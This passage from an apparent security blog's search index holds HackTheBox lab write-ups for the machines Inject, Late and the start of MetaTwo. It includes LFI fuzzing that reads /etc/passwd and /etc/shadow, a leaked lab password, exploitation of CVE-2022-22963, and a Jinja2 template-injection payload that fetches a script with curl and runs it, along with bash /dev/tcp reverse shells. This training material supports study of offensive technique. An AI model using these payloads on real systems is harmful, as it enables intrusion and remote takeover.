[+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/18 13:19:48 Starting gobuster in directory enumeration mode =============================================================== /register (Status: 200) [Size: 5654] /upload (Status: 200) [Size: 1857] /error (Status: 500) [Size: 106] /blogs (Status: 200) [Size: 5371] /environment (Status: 500) [Size: 712] /[ (Status: 400) [Size: 435] /plain] (Status: 400) [Size: 435] /] (Status: 400) [Size: 435] /quote] (Status: 400) [Size: 435] Progress: 20730 / 26585 (77.98%)[ERROR] 2023/05/18 13:24:19 [!] parse \u0026#34;http://10.10.11.204:8080/error\\x1f_log\u0026#34;: net/url: invalid control character in URL /extension] (Status: 400) [Size: 435] /[0-9] (Status: 400) [Size: 435] Progress: 26584 / 26585 (100.00%) =============================================================== 2023/05/18 13:25:50 Finished Foothold We have an upload and register pages I started playing around with upload page Uploaded media file with web shell in it, didn\u0026rsquo;t work But luckily we have lfi I used ffuf for fuzzing └─$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u \u0026#39;http://10.10.11.204:8080/show_image?img=FUZZ\u0026#39; -fc 500 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.204:8080/show_image?img=FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response status: 500 ________________________________________________ [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 131ms] * FUZZ: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 292ms] * FUZZ: ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 228, Words: 23, Lines: 10, Duration: 227ms] * FUZZ: ../../../../../../../../../../../../etc/hosts [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 111ms] * FUZZ: /../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 135ms] * FUZZ: ../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 135ms] * FUZZ: ../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 113ms] * FUZZ: ../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 150ms] * FUZZ: ../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 162ms] * FUZZ: ../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 193ms] * FUZZ: ../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 344ms] * FUZZ: ../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 352ms] * FUZZ: ../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 415ms] * FUZZ: ../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 416ms] * FUZZ: ../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 416ms] * FUZZ: ../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 416ms] * FUZZ: ../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 415ms] * FUZZ: ../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 440ms] * FUZZ: ../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 435ms] * FUZZ: ../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 474ms] * FUZZ: ../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 512ms] * FUZZ: ../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 283ms] * FUZZ: ../../../../../../etc/passwd\u0026amp;=%3C%3C%3C%3C [Status: 200, Size: 1345, Words: 1, Lines: 1, Duration: 202ms] * FUZZ: ../../../../../../../../../../../../etc/shadow [Status: 200, Size: 1345, Words: 1, Lines: 1, Duration: 292ms] * FUZZ: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow [Status: 200, Size: 1345, Words: 1, Lines: 1, Duration: 221ms] * FUZZ: /../../../../../../../../../../etc/shadow [Status: 200, Size: 4020, Words: 1, Lines: 1, Duration: 301ms] * FUZZ: ../../../../../../../dev [Status: 200, Size: 1345, Words: 1, Lines: 1, Duration: 294ms] * FUZZ: ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow Let\u0026rsquo;s check If we check the /var/www/WebApp, we see that it\u0026rsquo;s a Java project We can download pom.xml It\u0026rsquo;s a configuration file that manages dependencies \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.5\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;!-- lookup parent from repository --\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;groupId\u0026gt;com.example\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;WebApp\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.0.1-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;name\u0026gt;WebApp\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;Demo project for Spring Boot\u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;java.version\u0026gt;11\u0026lt;/java.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.sun.activation\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.activation\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-thymeleaf\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-devtools\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-function-web\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;bootstrap\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;webjars-locator-core\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${parent.version}\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;finalName\u0026gt;spring-webapp\u0026lt;/finalName\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; Now we have pom.xml we can start googling the possible vulnerabilities https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/ From pom.xml we see that spring-cloud-function-web\u0026rsquo;s version is 3.2.2 Potential cve-2022-22963 It looks like we need to add header spring.cloud.function.routing-expression https://www.fastly.com/blog/spring-has-sprung-breaking-down-cve-2022-22963-and-spring4shell-cve-2022 PoC Let\u0026rsquo;s test it I\u0026rsquo;ll create a file using cve-2022-22963 and then check it with lfi And it works Let\u0026rsquo;s get reverse shell I\u0026rsquo;ll download reverse shell script and execute it Now we have our foothold User There is a settings.xml file with creds, we can basically su as phil It\u0026rsquo;s located in /home/frank/.m2 phil:DocPhillovestoInject123 Root pspy shows automated tasks running in the background To be specific it\u0026rsquo;s ansible We have a potential privesc path All we need to do is to create a malicious yml in the /opt/automation/tasks and for the job to complete We can write to the /opt/automation/tasks because phil is in staff group and directory belongs to staff group ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/inject/images/inject.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/inject/","summary":"Inject Enumeration nmap ┌──(kali㉿kali)-[~/Documents/tasks] └─$ nmap -Pn -p- -T4 10.10.11.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 14:17 EDT Nmap scan report for 10.10.11.204 (10.10.11.204) Host is up (0.16s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5427/tcp filtered sco-peer-tta 8080/tcp open http-proxy 62318/tcp filtered unknown ┌──(kali㉿kali)-[~/Documents/tasks] └─$ nmap -sC -sV -p22,5427,8080,62318 10.10.11.204 -Pn -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 14:27 EDT Nmap scan report for 10.","tags":["HTB","file-read","directory-traversal","spring-cloud-function-spel-injection","java","java-spring","maven","spring-cloud-function-web","cve-2022-22963","command-injection","ansible","pspy","ansible-playbook"],"title":"[HTB] Machine: Inject"},{"categories":null,"contents":"Late Enumeration nmap └─$ nmap -Pn -p- 10.10.11.156 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 12:33 BST Nmap scan report for 10.10.11.156 (10.10.11.156) Host is up (0.16s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 696.11 seconds └─$ nmap -Pn -sC -sV 10.10.11.156 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 12:33 BST Nmap scan report for 10.10.11.156 (10.10.11.156) Host is up (0.20s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) | 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) |_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: Late - Best online image tools |_http-server-header: nginx/1.14.0 (Ubuntu) 2106/tcp filtered ekshell 3851/tcp filtered spectraport 3998/tcp filtered dnx 6006/tcp filtered X11:6 9502/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.09 seconds Wer Server vhosts late.htb, images.late.htb images.late.htb No other vhost was found └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://late.htb/\u0026#39; -H \u0026#39;Host: FUZZ.late.htb\u0026#39; -fs 9461 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://late.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.late.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 9461 ________________________________________________ [Status: 200, Size: 2187, Words: 448, Lines: 64, Duration: 486ms] * FUZZ: images gobuster └─$ gobuster dir -u http://late.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://late.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt [+] Timeout: 10s =============================================================== 2023/08/28 13:52:20 Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 9461] /contact.html (Status: 200) [Size: 6364] /assets (Status: 301) [Size: 194] [--\u0026gt; http://late.htb/assets/] └─$ gobuster dir -u http://images.late.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://images.late.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt [+] Timeout: 10s =============================================================== 2023/08/28 13:53:47 Starting gobuster in directory enumeration mode =============================================================== /scanner (Status: 500) [Size: 290] Foothold/User If we upload an image we receive a response with html tags The page says that it can convert image into text document, so maybe we have to send a picture with some text And it works It could be Optical Character recognition Like Tesseract OCR After playing around with request, I was stuck for a while until I saw a hint in the forum regarding SSTI So tried {{ 7 * 7 }} in the image And it worked Now let\u0026rsquo;s try running any command Since it\u0026rsquo;s a flask application, it usually uses jinja2 template engine https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python But when I tried the following payload: {{ cycler.__init__.__globals__.os.popen('id').read() }} It resulted in error Finally, I made it work by changing single quotes to double quotes and made the text bold {{ cycler.__init__.__globals__.os.popen(\u0026quot;id\u0026quot;).read() }} Let\u0026rsquo;s try getting reverse shell The less symbols we have, the better So I will curl script and pipe it to bash #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/443 0\u0026gt;\u0026amp;1 I had to play around with font again Comic Sans MS worked in this case {{ cycler.__init__.__globals__.os.popen(\u0026quot;curl 10.10.16.5/shell | bash \u0026quot;).read() }} svc_acc has a key, we can download it and connect via ssh for more stable connection Root Enumerate Interesting script that svc_acc can write to And was modified in last 5 minutes The content of the script #!/bin/bash RECIPIENT=\u0026#34;root@late.htb\u0026#34; SUBJECT=\u0026#34;Email from Server Login: SSH Alert\u0026#34; BODY=\u0026#34; A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a` \u0026#34; if [ ${PAM_TYPE} = \u0026#34;open_session\u0026#34; ]; then echo \u0026#34;Subject:${SUBJECT} ${BODY}\u0026#34; | /usr/sbin/sendmail ${RECIPIENT} fi We see that it is related with pam Let\u0026rsquo;s check pam\u0026rsquo;s config files svc_acc@late:/tmp$ grep -r ssh-alert.sh /etc/ /etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh It looks that script send email to root@late.htb when new ssh login occur We can test it using pspy and try ssh And it happens to be true We can modify script and get our shell But when I tried modifying it, I couldn\u0026rsquo;t lsattr shows a attribute set, which only allows appending svc_acc@late:/tmp$ lsattr /usr/local/sbin/ssh-alert.sh -----a--------e--- /usr/local/sbin/ssh-alert.sh So we can do echo \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.5/7777 0\u0026gt;\u0026amp;1\u0026quot; \u0026gt;\u0026gt; /usr/local/sbin/ssh-alert.sh Connect via ssh again and get `root ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/late/images/late.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/late/","summary":"Late Enumeration nmap └─$ nmap -Pn -p- 10.10.11.156 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 12:33 BST Nmap scan report for 10.10.11.156 (10.10.11.156) Host is up (0.16s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 696.11 seconds └─$ nmap -Pn -sC -sV 10.10.11.156 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 12:33 BST Nmap scan report for 10.","tags":["HTB","ocr","flask","tesseract","ssti","jinja2","payloadsallthethings","hacktricks","linpeas","pspy","chattr","lsattr","extended-attributes"],"title":"[HTB] Machine: Late"},{"categories":null,"contents":"MetaTwo Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.11.186 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 20:05 BST Warning: 10.10.11.186 giving up on port because retransmission cap hit (6). Stats: 0:02:40 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 77.06% done; ETC: 20:09 (0:00:48 remaining) Nmap scan report for 10.10.11.186 (10.10.11.186) Host is up (0.18s latency). Not shown: 811 closed tcp ports (conn-refused), 186 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] | Invalid command: try being more creative |_ Invalid command: try being more creative 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA) | 256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA) |_ 256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519) 80/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://metapress.htb/ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.94%I=7%D=8/30%Time=64EF93BA%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,8F,\u0026#34;220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10\\ SF:.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20cre SF:ative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creative SF:\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 240.95 seconds Web Server gobuster └─$ gobuster dir -u http://metapress.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://metapress.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/31 07:30:27 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/] /about (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/about-us/] /rss (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/feed/] /login (Status: 302) [Size: 0] [--\u0026gt; http://metapress.htb/wp-login.php] /events (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/events/] /feed (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/feed/] /0 (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/0/] /atom (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/feed/atom/] /s (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/sample-page/] /a (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/about-us/] /c (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/cancel-appointment/] /wp-content (Status: 301) [Size: 169] [--\u0026gt; http://metapress.htb/wp-content/] /admin (Status: 302) [Size: 0] [--\u0026gt; http://metapress.htb/wp-admin/] /t (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/thank-you/] /e (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/events/] /h (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/hello-world/] /wp-login.php (Status: 200) [Size: 6931] /rss2 (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/feed/] /About (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/about-us/] /ca (Status: 301) [Size: 0] [--\u0026gt; http://metapress.htb/cancel-appointment/] vhosts └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://metapress.htb/\u0026#39; -H \u0026#39;Host: FUZZ.metapress.htb\u0026#39; -fs 145 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://metapress.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.metapress.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 145 ________________________________________________ :: Progress: [19966/19966] :: Job [1/1] :: 385 req/sec :: Duration: [0:00:55] :: Errors: 0 :: wpscan └─$ wpscan --url http://metapress.htb -e _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://metapress.htb/ [10.10.11.186] [+] Started: Thu Aug 31 07:37:22 2023 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: nginx/1.18.0 | - X-Powered-By: PHP/8.0.24 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://metapress.htb/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://metapress.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22). | Found By: Rss Generator (Passive Detection) | - http://metapress.htb/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6.2\u0026lt;/generator\u0026gt; | - http://metapress.htb/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6.2\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwentyone | Location: http://metapress.htb/wp-content/themes/twentytwentyone/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt | [!] The version is out of date, the latest version is 1.8 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1 | Style Name: Twenty Twenty-One | Style URI: https://wordpress.org/themes/twentytwentyone/ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) | - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: \u0026#39;Version: 1.1\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:19 \u0026lt;============================================================================================================================================================\u0026gt; (494 / 494) 100.00% Time: 00:00:19 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:38 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:38 [i] No Timthumbs Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:05 \u0026lt;=============================================================================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:05 [i] No Config Backups Found. [+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:02 \u0026lt;===================================================================================================================================================================\u0026gt; (71 / 71) 100.00% Time: 00:00:02 [i] No DB Exports Found. [+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \u0026#34;Plain\u0026#34; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:03 \u0026lt;========================================================================================================================================================\u0026gt; (100 / 100) 100.00% Time: 00:00:03 [i] No Medias Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 